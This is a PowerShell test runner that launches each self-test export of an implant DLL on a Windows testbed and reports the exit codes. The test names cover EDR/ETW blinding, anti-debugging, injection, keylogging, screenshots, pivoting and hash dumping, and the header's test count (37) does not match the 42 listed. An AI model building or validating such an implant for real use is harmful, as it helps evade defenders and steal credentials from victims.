# Nyx P2 Full Bypass Selftest Runner
# Deploys & runs every nyx_selftest export on the Windows testbed.
# Collects exit codes and generates a structured report.

$ErrorActionPreference = 'SilentlyContinue'
$dll = 'C:\nyx\nyx_implant_win.dll'

# All selftest exports (37 total)
$tests = @(
    # Calibration
    'nyx_selftest_calib42',
    # Core
    'nyx_selftest_config',
    'nyx_selftest_hostinfo',
    'nyx_selftest_env',
    'nyx_selftest_recon',
    # Anti-debug
    'nyx_selftest_antidebug',
    # Syscall runtime
    'nyx_selftest_syscall_rt',
    'nyx_selftest_rt_probe',
    'nyx_selftest_rt_steps',
    # Blind NT trace
    'nyx_selftest_blind_nttrace',
    # Forwarded-export resolver regression (guards the resolve.rs forwarder fix)
    'nyx_selftest_resolve_forwarder',
    # HWBP patchless blind (VEH + DR0 on NtTraceEvent)
    'nyx_selftest_hwbp_blind',
    # Memory
    'nyx_selftest_mem',
    # Evasion (P2 core bypass modules)
    'nyx_selftest_evasion',
    'nyx_selftest_foliage',
    'nyx_selftest_foliage_apc',
    'nyx_selftest_swap_decision',
    'nyx_selftest_swap_armed',
    # Injection
    'nyx_selftest_inject',
    # Network
    'nyx_selftest_net',
    'nyx_selftest_portscan',
    # Filesystem
    'nyx_selftest_fs',
    'nyx_selftest_fs_edge',
    'nyx_selftest_fs_probe',
    'nyx_selftest_rm_probe',
    'nyx_selftest_rm_file',
    # Clipboard
    'nyx_selftest_clipboard',
    # Shell
    'nyx_selftest_shell',
    'nyx_selftest_shell_edge',
    # Screenshot
    'nyx_selftest_screenshot',
    'nyx_selftest_screenshot_diag',
    'nyx_selftest_screenwatch',
    # Keylogger
    'nyx_selftest_keylog',
    # Transport
    'nyx_selftest_transport',
    # BOF
    'nyx_selftest_bof',
    'nyx_selftest_bof_marker',
    'nyx_selftest_bof_diag',
    # Postex
    'nyx_selftest_postex',
    'nyx_selftest_pivot',
    # Hashdump
    'nyx_selftest_hashdump',
    'nyx_selftest_hashdump_diag'
)

Write-Host "============================================="
Write-Host "  Nyx P2 Full Bypass Selftest Runner"
Write-Host "  Target: WS2019 17763.1339"
Write-Host "  DLL:    $dll"
Write-Host "  Tests:  $($tests.Count)"
Write-Host "============================================="
Write-Host ""

if (-not (Test-Path $dll)) {
    Write-Host "ERROR: DLL not found at $dll" -ForegroundColor Red
    exit 1
}

$results = @()
foreach ($t in $tests) {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = 'rundll32.exe'
    $psi.Arguments = "$dll,$t"
    $psi.UseShellExecute = $false
    $psi.WorkingDirectory = 'C:\nyx'
    $psi.CreateNoWindow = $true
    $p = [System.Diagnostics.Process]::Start($psi)
    $exited = $p.WaitForExit(30000)
    if (-not $exited) {
        try { $p.Kill() } catch {}
        $code = 'TIMEOUT'
        $bin = 'TIMEOUT'
    } else {
        $code = $p.ExitCode
        if ($code -is [int]) {
            $bin = '0b{0}' -f [Convert]::ToString($code, 2)
        } else {
            $bin = [string]$code
        }
    }
    $results += [PSCustomObject]@{ Test=$t; Exit=$code; Bin=$bin }
    $color = 'White'
    if ($code -eq 'TIMEOUT') { $color = 'Yellow' }
    elseif ($code -eq 0) { $color = 'DarkGray' }
    else { $color = 'Green' }
    Write-Host ("{0,-38} exit={1,-10} {2}" -f $t, $code, $bin) -ForegroundColor $color
}

Write-Host ""
Write-Host "============================================="
Write-Host "  SUMMARY"
Write-Host "============================================="

$pass = ($results | Where-Object { $_.Exit -is [int] -and $_.Exit -ne 0 }).Count
$zero = ($results | Where-Object { $_.Exit -eq 0 }).Count
$to   = ($results | Where-Object { $_.Exit -eq 'TIMEOUT' }).Count
$total = $results.Count

Write-Host "Total tests:     $total"
Write-Host "Non-zero (PASS): $pass  (test returned a result bitmask/code)"
Write-Host "Zero-exit:       $zero  (may indicate early exit or no-op test)"
Write-Host "TIMEOUT:         $to   (test hung or waited for user input)"
Write-Host ""

# Highlight specific bypass module results
Write-Host "=== P2 Bypass Module Results ===" -ForegroundColor Cyan
$bypassTests = @(
    'nyx_selftest_foliage',
    'nyx_selftest_foliage_apc',
    'nyx_selftest_swap_decision',
    'nyx_selftest_swap_armed',
    'nyx_selftest_inject',
    'nyx_selftest_evasion',
    'nyx_selftest_mem'
)
foreach ($bt in $bypassTests) {
    $r = $results | Where-Object { $_.Test -eq $bt }
    if ($r) {
        $status = if ($r.Exit -eq 'TIMEOUT') { 'TIMEOUT' }
                  elseif ($r.Exit -eq 0) { 'NO-RESULT' }
                  else { "RESULT=$($r.Exit)" }
        Write-Host ("  {0,-38} {1}" -f $bt, $status) -ForegroundColor $(if ($r.Exit -ne 0 -and $r.Exit -ne 'TIMEOUT') { 'Green' } else { 'Yellow' })
    }
}

Write-Host ""
Write-Host "=== Anti-Debug + Syscall Runtime ===" -ForegroundColor Cyan
$coreTests = @(
    'nyx_selftest_antidebug',
    'nyx_selftest_syscall_rt',
    'nyx_selftest_rt_steps',
    'nyx_selftest_blind_nttrace'
)
foreach ($ct in $coreTests) {
    $r = $results | Where-Object { $_.Test -eq $ct }
    if ($r) {
        $status = if ($r.Exit -eq 'TIMEOUT') { 'TIMEOUT' }
                  elseif ($r.Exit -eq 0) { 'NO-RESULT' }
                  else { "RESULT=$($r.Exit)" }
        Write-Host ("  {0,-38} {1}" -f $ct, $status) -ForegroundColor $(if ($r.Exit -ne 0 -and $r.Exit -ne 'TIMEOUT') { 'Green' } else { 'Yellow' })
    }
}
